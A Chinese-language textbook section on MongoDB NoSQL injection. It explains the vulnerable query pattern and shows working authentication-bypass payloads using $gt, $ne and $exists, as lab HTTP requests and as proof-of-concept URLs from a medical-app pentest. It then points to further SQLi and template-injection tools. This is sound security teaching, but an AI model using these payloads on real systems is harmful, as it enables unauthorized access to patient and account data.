# 第 3 章 服务器端注入攻击简介

## 3.10 NoSQL 注入漏洞

NoSQL 数据库已经存在了相当一段时间，但它们最近受欢迎程度的激增与新技术栈（如 MEAN 和 MERN）的广泛采用以及现代 Web 应用程序不断变化的需求密切相关。

NoSQL 数据库旨在处理大量数据并进行水平扩展，使其成为大数据应用程序的理想选择。许多此类数据库利用 JSON 存储数据，与 Node.js、React 和 Angular 等服务器端技术完美契合。这使得数据交互更高效、无缝。

虽然有多种 NoSQL 数据库容易受到注入攻击，但 MongoDB 是这些数据库中部署最广泛的，因此在本节中，我们将重点介绍围绕 MongoDB 的攻击。

### 3.10.1 MongoDB NoSQL 注入利用

NoSQL 注入的根本原因与传统 SQL 注入相同，即将用户提供的输入直接插入数据库查询中，而未经适当的验证或清理。但是，由于 NoSQL 数据库不使用传统的 SQL 语法，并且通常依赖 JSON 或 JavaScript，因此注入技术有所不同。这些技术利用 NoSQL 系统的特定查询结构和能力。让我们通过一个示例来理解：

在 SQL 中，典型的登录语句如下所示：

**示例**
```sql
SELECT * FROM members WHERE username = 'tmgm' AND password = 'tmgm';
```

在 MongoDB 中，等效的登录查询如下所示：

**示例**
```javascript
db.members.find({ "username": "tmgm", "password": "tmgm" });
```

假设开发人员想从数据库中检索记录，如下所示：

**易受攻击的代码**
```javascript
db.collection('members').find({
    username: inputData.username,
    password: inputData.password
});
```

将 `inputData` 直接包含在数据库查询中可能导致注入漏洞。这是因为 MongoDB 对查询条件采用了特定的运算符，如果被攻击者操纵，可以改变查询的预期结果。

#### 3.10.1.1 MongoDB 运算符

MongoDB 注入通常通过使用某些运算符来利用；这些运算符具有不同的用途，可用于改变查询的逻辑。以下是运算符及其解释的列表。

| 运算符   | 解释                                 |
|----------|--------------------------------------|
| `$gt`    | 大于                                 |
| `$lt`    | 小于                                 |
| `$eq`    | 等于                                 |
| `$ne`    | 不等于                               |
| `$regex` | 正则表达式                           |
| `$in`    | 验证所需数据是否存在于数据结构（如数组）中 |
| `$exists`| 确定特定字段的存在                     |

#### 3.10.1.2 使用 NoSQL 注入绕过身份验证

考虑一个在其登录功能中实现了上述易受攻击代码的应用程序。使用无效凭据的传统 HTTP 请求如下所示：

**请求**
```
POST / HTTP/1.1
Host: 127.0.0.1:49090
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Connection: close

username=tmgm&password=1234
```

响应返回错误，表明凭据无效。

**图 3.55 响应显示凭据无效**

可以通过构造使用 MongoDB 运算符强制查询条件始终为真的 payload 来绕过身份验证。为此，我们将对 `username` 和 `password` 参数使用 `$gt` 运算符。

**请求**
```
POST / HTTP/1.1
Host: 127.0.0.1:49090
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Connection: close

username[$gt]=&password[$gt]=
```

当服务器将参数直接传递给 NoSQL 数据库查询时，此查询可能被解释为：

**示例**
```javascript
db.members.find({ "username": { "$gt": "" }, "password": { "$gt": "" } });
```

该查询要求数据库返回 username 和 password 字段的值大于空字符串的所有用户。由于数据库中的任何用户都会大于空字符串，因此该条件将始终返回 true，从而有效绕过身份验证。

以下截图显示以 `administrator` 用户身份成功登录。这是因为应用程序处理数据库返回的第一条用户记录，并根据该记录授予访问权限，在此场景中，`administrator` 用户恰好是数据库中的第一条记录。

**图 3.56 身份验证绕过**

### 3.10.2 NoSQL 注入真实示例

在对一个使用 MongoDB 进行数据库操作的医疗应用程序进行渗透测试期间，我们遇到了多个 NoSQL 注入实例。身份验证依赖于两个基本参数：

- **Patient ID**：此参数包含系统中每位患者的唯一 ID。
- **AuthKey**：AuthKey 用作身份验证的秘密令牌，保护敏感的患者数据。

在评估过程中，我们发现其中一个端点泄露了 `PatientID`。但是，要绕过身份验证，需要 `AuthKey`。这时我们使用了值为 `true` 的 `$exists` 运算符，它强制应用程序评估 `AuthKey` 字段的存在。换句话说，它使语句为真，从而绕过身份验证。

**绕过身份验证的 POC：**
```
www.vulnerableapp.com/api/v1/patients/getMedicalHistory?PatientID=11232241&AuthKey[$exists]=true
```

还有其他运算符，如 `$gt` 和 `$ne`，可用于查询以从数据库中返回特定记录。以下是应用程序其他功能中找到的 POC。

**检索医生详细信息的 POC**
`$gt` 运算符将检索 AuthToken 值大于 0 的记录。在大多数情况下，这将包括具有正数值 AuthToken 值的记录。
```
https://vulnerableapp.com/api/v1/doctor/getProfile?DoctorID=18141842&AuthKey[$gt]=0&UserType=doctor
```

**检索患者详细信息的 POC**
`$ne` 运算符将检索 `Auth_Key` 不等于 `0` 的记录；它将排除 Auth_Key 为 0 的记录，这可能表示无效或不活跃的账户。
```
https://vulnerableapp.com/api/v1/patients/getProfile?PatientID=123123213&AuthKey[$ne]=0
```

**提示：** 虽然前面描述的测试用例是针对基于布尔的注入，即你可以操纵查询以返回真或假条件，但测试其他类型的 MongoDB 注入漏洞也很重要。要测试潜在的 MongoDB 注入，请尝试在输入字段中使用特殊字符，如单引号（`'`）、双引号（`"`）、分号（`;`）、反斜杠（`\`）、括号（`()`）、方括号（`[]`）和花括号（`{}`）。

## 3.11 额外进阶

- **SQL 注入实验室**：尝试使用 `sqli-labs`，这是一个提供 12 种不同场景的仓库，涵盖了广泛的 SQL 注入技术。[https://github.com/Audi-1/sqli-labs]
- **堆叠查询**：研究堆叠查询并了解如何利用它们来利用 SQL 注入漏洞。探索它们在 MSSQL 中调用存储过程（如 `XP_CMDSHELL`）以实现 RCE 的用途。
- **双查询**：尝试基于双查询的注入，并发现它在数据外泄中的用途，尤其是在缺少基于 UNION 的技术的情况下。
- **SSTI 检测和利用工具**：探索像 TINJA 和 TPLMAP 这样的工具，用于自动检测和利用模板注入攻击。[TINJA](https://github.com/Hackmanit/TInjA) | [TPLMAP](https://github.com/epinna/tplmap)
- **模板注入表**：查看“Template Injection Table”，这是一个交互式表格，包含高效的模板注入 polyglot 以及来自 44 个主要模板引擎的预期响应。[https://github.com/Hackmanit/template-injection-table]
- **NoSQL 注入**：研究在 Elasticsearch、Amazon DynamoDB、Couchbase 等数据库中利用 NoSQL 注入漏洞的技术。
